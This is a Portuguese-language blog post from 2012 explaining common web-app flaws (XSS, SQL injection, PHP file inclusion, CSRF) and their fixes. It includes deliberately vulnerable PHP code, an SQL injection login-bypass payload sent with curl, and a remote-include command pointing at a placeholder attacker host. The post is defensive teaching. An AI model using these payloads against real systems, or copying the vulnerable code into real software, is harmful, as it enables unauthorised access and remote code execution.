<!DOCTYPE html><html lang=pt-br> <head><meta charset=utf-8><title>Problemas comuns de segurança em aplicações Web | Klaus Laube</title><meta name=author content="Klaus Peter Laube"><meta name=description content="Quando estamos desenvolvendo nossas aplicações Web, temos que “pensar” como um usuário mal-intencionado. Não somente para garantir o bom funcionamento da mesma, mas também para garantir a segurança e bem-estar dos “usuários civis” que consomem os nossos serviços."><meta name=robots content=index,follow><meta property=og:site_name content="Klaus Laube"><meta property=og:type content=website><meta name=keywords content="desenvolvimento, web, seguranca, xss, csrf, sql-injection, php-injection, django, php, codeigniter"><meta property=og:title content="Problemas comuns de segurança em aplicações Web"><meta property=og:description content="Quando estamos desenvolvendo nossas aplicações Web, temos que “pensar” como um usuário mal-intencionado. Não somente para garantir o bom funcionamento da mesma, mas também para garantir a segurança e bem-estar dos “usuários civis” que consomem os nossos serviços."><meta property=og:url content=https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html><meta property=og:image content><meta property=fb:app_id content=262757647133878><meta name=google-site-verification content=xCq0H3B3JhkPcAdZ03J0vayijvH_g1rQVMZ_DVcMsQY><meta name=viewport content="width=device-width, initial-scale=1.0"><link rel=icon type=image/x-icon href=https://klauslaube.com.br/favicon.ico><link rel=alternate type=application/rss+xml title="Klaus Laube » Feed" href=https://klauslaube.com.br/feed/rss.xml><link rel=canonical href=https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html><link rel=stylesheet href=https://unpkg.com/purecss@1.0.0/build/pure-min.css integrity=sha384-nn4HPE8lTHyVtfCBi5yW9d20FjT8BJwUXyWZT9InLYax14RDjBj46LmSztkmNP9w crossorigin=anonymous><link rel=stylesheet href=https://klauslaube.com.br/theme/css/styles.min.css?0830b1e2></head> <body> <div class="Page pure-g is-fullEntry"> <div class="PageHeader pure-u-1"> <nav class="pure-menu pure-menu-open pure-menu-horizontal"> <a href=https://klauslaube.com.br/index.html title="Home page" class="PageHeader-link pure-menu-heading pure-menu-link">Klaus<span class=u-highlighted>Laube</a> <ul class="PageHeader-menu pure-menu-list"> <li class=pure-menu-item> <a href=https://about.me/klauslaube class="PageHeader-menu-link pure-menu-link">Contato</a> </li> </ul> </nav> </div> <div class="PageContent pure-u-1"> <article class="Article u-box" itemscope itemtype=http://schema.org/BlogPosting> <div itemprop=image itemscope itemtype=http://schema.org/ImageObject> <meta itemprop=url content> </div> <span itemprop=mainEntityOfPage> <header> <h1 class=Article-title itemprop="headline name"> Problemas comuns de segurança em aplicações Web </h1> <p class=Article-meta> Por <span class=Article-author itemprop=author>Klaus Peter Laube</span>. <span class=Article-pubDate> Publicado em <time datetime=2012-04-15T18:03:48-03:00 itemprop=datePublished>15 Abr, 2012</time> </span> </p> </header> <div class=Article-content itemprop=articleBody> <img src=/images/blog/security.jpg alt=Segurança class=representative-image width=180 height=180> <p>Seria perfeito se o mundo fosse feito apenas de pessoas bem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem a raça humana, do que o homem deixar de tirar proveito de alguma situação.</p> <!-- PELICAN_END_SUMMARY --> <p>Quando estamos desenvolvendo nossas aplicações <a href=https://klauslaube.com.br/tag/web.html title="Leia mais sobre Web"><em>web</em></a>, temos que “pensar” como um usuário mal-intencionado. Não somente para garantir o bom funcionamento da mesma, mas também para garantir a segurança e bem-estar dos “usuários civis” que consomem os nossos serviços.</p> <p>Vamos explorar alguns problemas relacionados a segurança, e mostrar como solucioná-los de forma simples e prática.</p> <h2>Use frameworks!</h2> <p>E esta é a minha primeira dica para você: use <em>frameworks</em> sempre que possível!</p> <p>Eles já possuem um conjunto de ferramentas que contornam problemas como <em>SQL Injection</em>, <em>XSS</em> e <em>CSRF</em>. Pessoas muito inteligentes já pensaram no problema e já solucionaram para você. Na maioria dos casos, mais de uma vez!</p> <p>Em alguns <em>frameworks</em>, como o <a href=https://klauslaube.com.br/tag/django.html title="Leia mais sobre Django"><em>Django</em></a> e <a href=https://klauslaube.com.br/tag/codeigniter.html title="Leia mais sobre Codeigniter"><em>Codeigniter</em></a>, essas ferramentas são quase “transparentes”, ou seja, você tem pouco (ou nenhum) trabalho para utilizá-las no cotidiano.</p> <p>Já trabalhei por muito tempo com “desenvolvimento from scratch”, e hoje posso apontar vários pontos de falhas em aplicações que produzi no passado. Os <em>frameworks</em> diminuem muito estes pontos, por isso vale a pena o seu uso.</p> <h2>Validações (nunca confie no usuário)</h2> <p>Como eu comecei com o <a href=https://klauslaube.com.br/tag/php.html title="Leia mais sobre PHP"><em>PHP</em></a>, sei muito bem que este é um problema comum em aplicações desenvolvidas por iniciantes.</p> <p><strong>Nunca confie no usuário</strong>, e principalmente <strong>nunca confie em validações realizadas pelo <a href=https://klauslaube.com.br/tag/javascript.html title="Leia mais sobre Javascript"><em>Javascript</em></a></strong>. Todo ponto de entrada de informação deve possuir uma validação no <em>server-side</em>, mesmo que exista uma validação no <em>client-side</em>. <strong>Lembre-se:</strong> Existem navegadores que não utilizam <em>Javascript</em>, e mesmo os que utilizam, permitem que o usuário desabilite esta função.</p> <p>No <em>Django</em>, podemos fazer validações de formulários através de <a href=https://docs.djangoproject.com/en/dev/topics/forms/ title="Conheça os Forms no Django"><em>Forms</em></a>. No <em>Codeigniter</em> fazemos através da <a href=http://codeigniter.com/user_guide/libraries/form_validation.html title="Veja como fazer validações de formulário no Codeigniter"><em>Form Validation Class</em></a>. Em <em>PHP</em> “puro”, podemos fazer validações através da <a href=http://pear.php.net/manual/en/package.validate.validate.intro.php title="Instale a Validate através da PEAR">biblioteca <em>Validate</em></a>.</p> <p>As ferramentas citadas acima são extremamente eficientes para ações realizadas via <em>POST</em>. Mas e quando temos parâmetros vindos da <em>URL</em>, através do método <em>GET</em>, qual é a melhor maneira de agirmos?</p> <h3>URLs seguras e amigáveis</h3> <p>Há um bom tempo que as “URLs amigáveis” deixaram de ser um diferencial nas aplicações <em>web</em> e tornaram-se item obrigatório. Além de trazer o benefício do <a href=http://pt.wikipedia.org/wiki/Otimiza%C3%A7%C3%A3o_para_motores_de_busca title="Leia mais sobre SEO no Wikipedia"><em>SEO</em></a>, elas podem ser uma grande aliada quando o assunto é segurança.</p> <p><em>URLs</em> que antes eram feitas dessa maneira:</p> <div class=highlight><pre><span></span>/blog.php?year<span class=o>=</span><span class=m>2012</span><span class=p>&amp;</span><span class=nv>month</span><span class=o>=</span><span class=m>12</span><span class=p>&amp;</span><span class=nv>day</span><span class=o>=</span><span class=m>21</span>
</pre></div> <p>Podem ser reproduzidas desta forma:</p> <div class=highlight><pre><span></span>/blog/2012/12/21/
</pre></div> <p>O mecanismo de rotas de alguns <em>frameworks</em> permite a utilização de expressões regulares na construção do caminho. Por exemplo, em <em>Django</em> temos o seguinte cenário:</p> <div class=highlight><pre><span></span><span class=c1># urls.py</span>

<span class=n>urlpatterns</span> <span class=o>=</span> <span class=n>patterns</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span>
    <span class=o>...</span>
    <span class=p>(</span><span class=sa>r</span><span class=s1>&#39;^blog/(?P&lt;year&gt;\d{4})/(?P&lt;month&gt;[0-9]{2})/(?P&lt;day&gt;\d{2})/$&#39;</span><span class=p>,</span> <span class=s1>&#39;blog.views.index&#39;</span><span class=p>),</span>
    <span class=o>...</span>
<span class=p>)</span>
</pre></div> <p>Determinamos que a rota inicia-se por <code>blog</code>, sendo composta por um valor numérico de 4 dígitos que atende pelo identificador <code>year</code>, outro valor de dois dígitos, indo de 0 a 9, chamado <code>month</code>, e o último um valor numérico de 2 dígitos chamado <code>day</code>.</p> <p>A verificação é feita no momento da requisição. Se a rota informada bater com o padrão criado, ele executa a <em>view</em> <code>blog.views</code>. Caso contrário, se a rota não bater com nenhum padrão informado (por exemplo, <code>/blog/2012/aa/21/</code>), o usuário tomará um erro 404.</p> <p>Em nossa <em>view</em>, resgataríamos esses valores da seguinte forma:</p> <div class=highlight><pre><span></span><span class=c1># blog/views.py</span>

<span class=k>def</span> <span class=nf>index</span><span class=p>(</span><span class=n>request</span><span class=p>,</span> <span class=n>year</span><span class=p>,</span> <span class=n>month</span><span class=p>,</span> <span class=n>day</span><span class=p>):</span>
    <span class=c1># Lógica de renderização...</span>
</pre></div> <p>Simples assim! Temos um “input” de informação através de <em>GET</em>, onde temos certeza do seu tipo e tamanho.</p> <p>O mesmo resultado pode ser obtido com o <em>Codeigniter</em>, basta adicionar a expressão desejada em seu <code>application/config/routes.php</code>:</p> <div class=highlight><pre><span></span><span class=x># application/config/routes.php</span>

<span class=x>$route[&#39;blog/(\d{4})/([0-9]{2})/(\d{2})&#39;] = &quot;blog/index/$1/$2/$3&quot;;</span>
</pre></div> <p>Aos invés de utilizarmos identificadores, utilizamos a ordem dos grupos criados na expressão regular.</p> <p>Você não precisa utilizar um <em>framework</em> para ter um esquema de rotas como ilustrado acima. Um resultado parecido pode ser atingido através do <a href=https://klauslaube.com.br/tag/nginx.html title="Leia mais sobre Nginx"><em>Nginx</em></a> e do <em>Apache</em> com <em>mod-rewrite</em>. <a href=http://stackoverflow.com/questions/812571/how-to-create-friendly-url-in-php title="Como criar rotas para arquivos PHP com o Apache">Veja um exemplo de uso</a> apresentado numa <em>thread</em> do <em>Stack Overflow</em>.</p> <p>É claro que verificações mais complexas, como por exemplo, se o nome do usuário informado na <em>URL</em> é válido, necessitam de regras específicas, muito provavelmente escritas dentro da <em>view</em>. Um ponto de falha que vale ressaltar é a criação de expressões regulares “genéricas”, que não discriminam o tipo e tamanho dos valores informados.</p> <h3>Verificação de tipos de dados</h3> <p>Mas e quando não temos como fugir de um valor passado via <em>GET</em>? Pode acontecer! Por exemplo, em paginações (onde normalmente passamos um valor <code>page</code> como parâmetro), ou em uma busca (onde passamos o valor pesquisado via <em>GET</em>).</p> <p>Nesse caso, “forçamos” o tipo do dado informado, e diminuímos problemas de interpretação do nosso código:</p> <div class=highlight><pre><span></span><span class=cp>&lt;?php</span>

<span class=nv>$page</span> <span class=o>=</span> <span class=nb>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nb>preg_match</span><span class=p>(</span><span class=s1>&#39;/^\d+$/&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>]</span> <span class=o>:</span> <span class=mi>1</span><span class=p>;</span>

<span class=cp>?&gt;</span><span class=x></span>
</pre></div> <p>A solução acima não é infalível, mas é uma maneira de diminuírmos a incidência de erros. Se um valor diferente de inteiro positivo for passado, a página a ser exibida será a primeira.</p> <h2>XSS – Cross-Site Scripting (não confie na informação)</h2> <p>É certo que, validando toda e qualquer informação que a sua aplicação receber, você diminuirá muito a ocorrência de problemas. Mas, mesmo confiando no tipo e nas dimensões da informação, não podemos confiar no seu conteúdo.</p> <p>Imagine que você possua um <em>blog</em>. Só você pode escrever artigos nele, então você conhece o conteúdo da informação sendo produzida. Certo dia você resolve que os usuários poderão comentar no seu <em>blog</em>, e desenvolve uma ferramenta de comentários com todas as validações citadas anteriormente.</p> <p>Até que em certo momento, um usuário mal-intencionado <strong>escreve um comentário</strong> no seu <em>post</em>, e neste comentário existe um <strong><em>script</em></strong> <em>Javascript</em> que explora uma <strong>falha de segurança</strong> do <em>ActiveX</em> (por exemplo). Logo, todos os leitores que utilizam <em>Internet Explorer</em> e leram o seu <em>post</em> são infectados por um <em>malware</em> que o seu <em>blog</em> ajudou a proliferar.</p> <p>A injeção de um <em>script</em> em um <em>website</em>, através de campos de textos ou passagem de parâmetros, é caracterizado como um ataque de <strong><em>Cross-Site Scripting</em></strong> (ou <em>XSS</em>).</p> <p>Uma maneira muito comum de evitar esse tipo de problema é simplesmente “escapando” ou removendo elementos <em>HTML</em> do conteúdo:</p> <div class=highlight><pre><span></span><span class=cp>&lt;?php</span>
<span class=c1># xss.php</span>

<span class=nv>$var</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;var&#39;</span><span class=p>];</span>

<span class=k>echo</span> <span class=nb>htmlspecialchars</span><span class=p>(</span><span class=nv>$var</span><span class=p>);</span>

<span class=cp>?&gt;</span><span class=x></span>
</pre></div> <p>Acessar <code>xss.php</code> com um <code>alert</code> <em>Javascript</em> como parâmetro, não executará o comando, e sim apenas exibirá o conteúdo na tela, com os caracteres que delimitam o elemento <code>script</code> devidamente formatados:</p> <div class=highlight><pre><span></span>http://localhost/xss.php?var<span class=o>=</span>&lt;script&gt;alert<span class=o>(</span><span class=s2>&quot;XSS!&quot;</span><span class=o>)</span><span class=p>;</span>&lt;/script&gt;
</pre></div> <p>Existem alguns <a href=http://www.webdesignerdepot.com/2008/12/20-excellent-free-rich-text-editors/ title="Conheça 20 excelentes editores WYSIWYG"><em>Rich Text Editors</em></a> que verificam e formatam o conteúdo do campo antes de uma submissão. Mas <strong>lembre-se</strong>! Editores <em>WYSIWYG</em> são basicamente <em>Javascript</em>, logo, se eu desabilitar o <em>Javascript</em> do meu navegador, posso enviar <em>scripts</em> maliciosos sem impeditivo nenhum, por isso, é sempre necessário fazermos esse tipo de validação no <em>server-side</em>.</p> <p>O <em>Codeigniter</em>, com a opção <code>$config['global_xss_filtering’]</code> como <code>TRUE</code>, filtra automaticamente os dados resgatados de <em>GET</em> ou <em>POST</em>. O que acho bacana desse filtro, é que ele previne apenas a injeção de <em>scripts</em> e atributos que podem de alguma forma prejudicar na segurança da sua aplicação, não necessariamente formatando o conteúdo todo.</p> <p>Este tratamento está ativo por padrão no <em>engine</em> de <em>templates</em> do <em>Django</em>. Embora isso não impeça o armazenamento do <em>script</em> no banco de dados, impede que a sua renderização afete os usuários da sua aplicação.</p> <p>Uma outra forma muito bacana de prevenir este tipo de inconveniente é utilizando uma linguagem de marcação alternativa, como <em>Textile</em> e <em>Markdown</em>, em campos de textos abertos.</p> <h2>SQL Injection (não confie em sua aplicação)</h2> <p>Entre as vulnerabilidades citadas, acredito que o <strong><em>SQL Injection</em></strong> é uma das mais destrutivas, tanto para a sua aplicação, quanto para os seus usuários.</p> <p>Segundo o <em>Wikipedia</em>:</p> <blockquote> <p>É um tipo de ameaça de segurança que se aproveita de falhas em sistemas que interagem com bases de dados via SQL. A injeção de SQL ocorre quando o atacante consegue inserir uma série de instruções SQL dentro de uma consulta (query) através da manipulação das entrada de dados de uma aplicação.</p> </blockquote> <p>Os resultados podem ser os mais desastrosos, como por exemplo, o acesso de usuários não autorizados a áreas restritas, e o roubo de informações da sua base de dados. Abaixo, uma autenticação simples, utilizando nome de usuário e senha:</p> <div class=highlight><pre><span></span><span class=cp>&lt;?php</span>
<span class=c1># sql-injection.php</span>

<span class=k>if</span> <span class=p>(</span><span class=nb>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;usuario&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nb>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;senha&#39;</span><span class=p>]))</span> <span class=p>{</span>
    <span class=nv>$usuario</span>    <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;usuario&#39;</span><span class=p>];</span>
    <span class=nv>$senha</span>      <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;senha&#39;</span><span class=p>];</span>

    <span class=c1>// Abre conexão com o banco de dados</span>
    <span class=nv>$link</span> <span class=o>=</span> <span class=nb>mysql_connect</span><span class=p>(</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=s1>&#39;root&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>);</span>
    <span class=c1>// Seleciona a base de dados</span>
    <span class=nb>mysql_select_db</span><span class=p>(</span><span class=s1>&#39;exemplos_blog&#39;</span><span class=p>);</span>

    <span class=c1>// Faz a consulta ao banco, comparando usuário e senha</span>
    <span class=nv>$query</span> <span class=o>=</span> <span class=s2>&quot;SELECT 1 FROM usuario WHERE usuario = &#39;</span><span class=si>{</span><span class=nv>$usuario</span><span class=si>}</span><span class=s2>&#39; &quot;</span>
        <span class=o>.</span> <span class=s2>&quot;AND senha = &#39;</span><span class=si>{</span><span class=nv>$senha</span><span class=si>}</span><span class=s2>&#39;&quot;</span><span class=p>;</span>
    <span class=nv>$result</span> <span class=o>=</span> <span class=nb>mysql_query</span><span class=p>(</span><span class=nv>$query</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span><span class=s2>&quot;Query inválida: &quot;</span>
        <span class=o>.</span> <span class=nb>mysql_error</span><span class=p>()</span> <span class=o>.</span> <span class=s2>&quot;</span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>);</span>

    <span class=nb>mysql_close</span><span class=p>(</span><span class=nv>$link</span><span class=p>);</span>

    <span class=k>if</span> <span class=p>(</span><span class=nb>mysql_num_rows</span><span class=p>(</span><span class=nv>$result</span><span class=p>))</span> <span class=p>{</span>
        <span class=c1>// Vai para a página logada</span>
        <span class=k>echo</span> <span class=s1>&#39;Login com sucesso&#39;</span><span class=p>;</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=c1>// Errou o usuário e senha, volta para a página de login</span>
        <span class=k>echo</span> <span class=s1>&#39;Usuário e senha inválidos&#39;</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
    <span class=c1>// Vai para a página de login</span>
<span class=p>}</span>

<span class=cp>?&gt;</span><span class=x></span>
</pre></div> <p>Levando em consideração que temos um usuário com nome <code>teste</code> e senha <code>teste</code>, se executarmos a instrução abaixo, será exibida uma mensagem de <em>login</em> inválido:</p> <div class=highlight><pre><span></span>$ curl --data <span class=s2>&quot;usuario=foo&amp;senha=bar&quot;</span> http://localhost/sql-injection.php

Usuário e senha inválidos
</pre></div> <p>Evidente! Este usuário não existe no banco de dados. Mas, podemos imaginar que a aplicação não possua proteção contra injeções <em>SQL</em>, então podemos fazer com que a consulta retorne positivo, e que nosso acesso seja garantido mesmo não possuindo um usuário no banco de dados.</p> <div class=highlight><pre><span></span>$ curl --data <span class=s2>&quot;usuario=foo&amp;senha=bar&#39; OR &#39;1&#39; = &#39;1&quot;</span> http://localhost/sql-injection.php

Login com sucesso
</pre></div> <p>A nossa <em>query</em>, por não fazermos um tratamento nos campos do formulário, foi composta pelo valor <code>bar’ OR '1’ = ’1</code>, o que resultou no seguinte <em>SQL</em>:</p> <div class=highlight><pre><span></span><span class=k>SELECT</span> <span class=mi>1</span> <span class=k>FROM</span> <span class=n>usuario</span> <span class=k>WHERE</span> <span class=n>usuario</span> <span class=o>=</span> <span class=s1>&#39;foo&#39;</span> <span class=k>AND</span> <span class=n>senha</span> <span class=o>=</span> <span class=s1>&#39;bar&#39;</span> <span class=k>OR</span> <span class=s1>&#39;1&#39;</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span>
</pre></div> <p>Existem algumas soluções para este problema, como o uso de <code>addslashes</code> no <em>PHP</em>, mas os que fazem mais sentido para mim são:</p> <ul> <li>O uso da função <code>mysql_real_escape_string</code> para formatar dados antes de construir a <em>query</em>;</li> <li>O uso da classe <code>mysqli</code> para consultas a bancos de dados <em>MySQL</em>, ao invés do uso das funções <em>mysql</em>.</li> </ul> <p>A primeira é a mais prática de aplicarmos. No código anterior, bastaria formatar os valores na hora que são resgatados do <em>array</em> <code>$_POST</code>:</p> <div class=highlight><pre><span></span><span class=x>$usuario    = mysql_real_escape_string($_POST[&#39;usuario&#39;]);</span>
<span class=x>$senha      = mysql_real_escape_string($_POST[&#39;senha&#39;]);</span>
</pre></div> <p>Com o <strong>mysqli</strong>, precisamos fazer algumas alterações no código, como demonstrado abaixo:</p> <div class=highlight><pre><span></span><span class=cp>&lt;?php</span>
<span class=c1># sql-injection.php (com mysqli)</span>

<span class=k>if</span> <span class=p>(</span><span class=nb>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;usuario&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nb>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;senha&#39;</span><span class=p>]))</span> <span class=p>{</span>
    <span class=nv>$usuario</span>    <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;usuario&#39;</span><span class=p>];</span>
    <span class=nv>$senha</span>      <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;senha&#39;</span><span class=p>];</span>

    <span class=c1>// Abre conexão com o banco de dados</span>
    <span class=nv>$mysqli</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>mysqli</span><span class=p>(</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=s1>&#39;root&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;exemplos_blog&#39;</span><span class=p>);</span>
    <span class=c1>// Faz a consulta ao banco, comparando usuário e senha</span>
    <span class=nv>$query</span> <span class=o>=</span> <span class=nv>$mysqli</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span><span class=s2>&quot;SELECT 1 FROM usuario WHERE usuario = ? &quot;</span>
        <span class=o>.</span> <span class=s2>&quot;AND senha = ?&quot;</span><span class=p>);</span>
    <span class=nv>$query</span><span class=o>-&gt;</span><span class=na>bind_param</span><span class=p>(</span><span class=s1>&#39;ss&#39;</span><span class=p>,</span> <span class=nv>$usuario</span><span class=p>,</span> <span class=nv>$senha</span><span class=p>);</span>
    <span class=nv>$query</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span>
    <span class=nv>$query</span><span class=o>-&gt;</span><span class=na>store_result</span><span class=p>();</span>

    <span class=nv>$num_rows</span> <span class=o>=</span> <span class=nv>$query</span><span class=o>-&gt;</span><span class=na>num_rows</span><span class=p>;</span>

    <span class=nv>$query</span><span class=o>-&gt;</span><span class=na>close</span><span class=p>();</span>

    <span class=k>if</span> <span class=p>(</span><span class=nv>$num_rows</span><span class=p>)</span> <span class=p>{</span>
        <span class=c1>// Vai para a página logada</span>
        <span class=k>echo</span> <span class=s1>&#39;Login com sucesso&#39;</span><span class=p>;</span>
    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
        <span class=c1>// Errou o usuário e senha, volta para a página de login</span>
        <span class=k>echo</span> <span class=s1>&#39;Usuário e senha inválidos&#39;</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
    <span class=c1>// Vai para a página de login</span>
<span class=p>}</span>

<span class=cp>?&gt;</span><span class=x></span>
</pre></div> <p>Mas como o mundo não é feito só de <em>MySQL</em>, se ocorrer de você utilizar um outro banco de dados, eu recomendo o uso da biblioteca <a href=http://php.net/pdo title="Conheça a lib PDO do PHP"><em>PDO</em></a>.</p> <p>Como o <a href=https://docs.djangoproject.com/en/1.4/topics/db/queries/ title="Making queries"><em>Django</em> utiliza <em>ORM</em></a>, e o <a href=http://codeigniter.com/user_guide/database/active_record.html title="Active Record Class"><em>Codeigniter</em> tem a <em>Active Record Class</em></a>, nesses <em>frameworks</em> essa validação é feita no momento que interagimos com os seus <em>models</em>. Mas é sempre bom ter cuidado! Principalmente quando o <em>ORM</em> não atende o nosso requisito, e temos que partir para consultas <em>SQL</em> puras.</p> <h3>Senhas criptografadas</h3> <p>Uma boa dica é, sempre que persistirmos um usuário em nossa base de dados, armazenarmos a sua senha criptografada em um formato “sem volta” (conhecido como <em>hash</em>). Além de ser um princípio ético, que na minha opinião todo o desenvolver de aplicações deveria ter, garantimos que mesmo que a nossa aplicação seja invadida, as senhas dos usuários estarão “seguras”.</p> <p>Embora o <a href=http://pt.wikipedia.org/wiki/MD5 title="Conheça o algoritmo MD5"><em>MD5</em></a> e o <a href=http://pt.wikipedia.org/wiki/SHA1 title="Conheça o algoritmo SHA1"><em>SHA1</em></a> sejam as escolhas mais populares, os desenvolvedores do <em>Django</em> <a href=https://docs.djangoproject.com/en/dev/releases/1.4/#improved-password-hashing title="Leia a release note do Django 1.4">recomendam o uso de algoritmos mais sofisticados</a>, como o <a href=http://en.wikipedia.org/wiki/PBKDF2 title="Conheça o algoritmo PBKDF2"><em>PBKDF2</em></a>, por acreditarem que o poder computacional atingiu um nível, que senhas <em>MD5</em> e <em>SHA1</em> podem com considerável esforço ser quebradas.</p> <h2>PHP Injection (não confie no PHP)</h2> <p>Embora esta técnica possa acontecer em outras linguagens, o <em>PHP</em> dá muita margem para desenvolvedores menos experientes deixarem brechas para uma vulnerabilidade conhecida como <strong><em>PHP Injection</em></strong>.</p> <p>Com o site dividido em seções, é comum termos inclusões de arquivos <em>PHP</em> para compor uma página. Para economizar esforço e linhas de código, deixamos as partes como menu e topo “estáticas”, e só alteramos o conteúdo do bloco principal da página. Acontece que em alguns casos, o desenvolvedor espera que um determinado arquivo seja importado de acordo com a <em>URL</em> que o internauta está visitando. Por exemplo:</p> <div class=highlight><pre><span></span><span class=cp>&lt;?php</span>
<span class=c1># php-injection.php</span>

<span class=nv>$page</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;page&#39;</span><span class=p>];</span>

<span class=k>include</span><span class=p>(</span><span class=s1>&#39;topo.php&#39;</span><span class=p>);</span>
<span class=k>include</span><span class=p>(</span><span class=s1>&#39;menu.php&#39;</span><span class=p>);</span>

<span class=k>include</span><span class=p>(</span><span class=nv>$page</span><span class=p>);</span>

<span class=cp>?&gt;</span><span class=x></span>
</pre></div> <p>Logo:</p> <div class=highlight><pre><span></span>$ curl http://localhost/php-injection.php?page<span class=o>=</span>novidades.php
</pre></div> <p>No caso acima, estamos incluindo o arquivo <code>novidades.php</code> e automaticamente exibindo o seu conteúdo. Podemos navegar por outras áreas do <em>website</em>, por exemplo, <code>page=contato.php</code> ou <code>page=institucional.php</code>. Mas, e se informarmos <code>page=php-injection.php</code>?</p> <p>Caímos num <em>looping</em> infinito!</p> <p>E, infelizmente, esse é o menor dos nossos problemas. O <em>PHP</em>, quando configurado com a opção <code>allow_url_include</code> como <code>TRUE</code>, é capaz de importar arquivos de outros <em>hosts</em>. Logo, o atacante pode ter um <em>script</em> malicioso hospedado em seu servidor, e passar o caminho dele para a aplicação acima. A aplicação incluirá e interpretará o <em>PHP</em> que estiver neste <em>script</em>:</p> <div class=highlight><pre><span></span>$ curl http://localhost/php-injection.php?page<span class=o>=</span>http://sitedoatacante.com.br/meu-script-malicioso.php.txt
</pre></div> <p>Pronto! Temos código <em>PHP</em> de outra pessoa executando em nosso servidor.</p> <p>Para resolver este problema, configure a opção <code>allow_url_include</code> em seu <code>php.ini</code> como <code>FALSE</code>. Outro passo importante é, sempre que for importar algum arquivo que dependa de informações vindas do usuário, verifique o conteúdo desta informação. Exemplo:</p> <div class=highlight><pre><span></span><span class=x>switch($page) {</span>
<span class=x>    case &#39;novidades&#39;:</span>
<span class=x>        include(&#39;novidades.php&#39;);</span>
<span class=x>        break;</span>
<span class=x>    case &#39;contato&#39;:</span>
<span class=x>        include(&#39;contato.php&#39;);</span>
<span class=x>        break;</span>
<span class=x>    case &#39;institucional&#39;:</span>
<span class=x>        include(&#39;institucional.php&#39;);</span>
<span class=x>        break;</span>
<span class=x>    default:</span>
<span class=x>        include(&#39;404.php&#39;);</span>
<span class=x>}</span>
</pre></div> <p>Este ataque não é tão incomum quanto deveria. Fique atento.</p> <h2>CSRF – Cross-site request forgery (não confie na requisição)</h2> <p>O <strong><em>Cross-site request forgery</em></strong> ou <strong>falsificação de solicitação entre sites</strong>, é uma forma de ataque que mescla a <a href=http://pt.wikipedia.org/wiki/Engenharia_social_(seguran%C3%A7a_da_informa%C3%A7%C3%A3o) title="Leia mais sobre Engenharia Social no Wikipedia">Engenharia Social</a> com vulnerabilidades das aplicações <em>web</em>.</p> <p>O ataque pode ser feito da seguinte forma:</p> <ul> <li>Você recebe um <em>e-mail</em> com uma <em>URL</em> oculta (geralmente algum <em>e-mail</em> do tipo “Veja as minhas fotos” (: )</li> <li>Esta <em>URL</em> executa alguma ação em uma aplicação que você esteja autenticado no momento (por exemplo, o <em>Facebook</em>)</li> <li>Esta ação pode, tanto dar poderes de acesso ao atacante, quanto alterar ou remover os seus dados permanentemente</li> </ul> <p>Note que o primeiro item pode ser substituído por algum <strong>conteúdo <em>link</em> injetado via <em>XSS</em></strong> em algum fórum ou área de comentários de um <em>blog</em>.</p> <p>Embora o exemplo acima não represente tanta ameaça, existem vários tipos de aplicações que este tipo de técnica pode afetar. O exemplo do banco, encontrado no <em>site</em> <a href=https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF) title="Leia mais sobre CSRF"><em>The Open Web Application Security Project</em></a>, é um excelente exempo de ataque <em>CSRF</em>.</p> <p>Para prevenir este tipo de problema, podemos fazer um controle através de <a href=https://klauslaube.com.br/2012/04/05/entendendo-os-cookies-e-sessoes.html title="Entendendo o Cookies e Sessões">sessões</a> e transmitir um <em>token</em> que identifique que a requisição foi de fato feita pelo usuário. <em>Kinn Coelho Julião</em> escreveu <a href=http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/ title="Protegendo seus sistemas contra ataques CSRF">um <em>post</em> interessante para o <em>PHP-SP</em></a>, demonstrando como prevenir ataques <em>CSRF</em> através de <em>token</em>.</p> <p>De fato, tanto o <em>Django</em> quanto o <em>Codeigniter</em> utilizam essa tática para prevenir ataques <em>CSRF</em>. No <em>Django</em>, com o <em>middleware</em> <code>django.middleware.csrf.CsrfViewMiddleware</code>, basta adicionar a chamada da 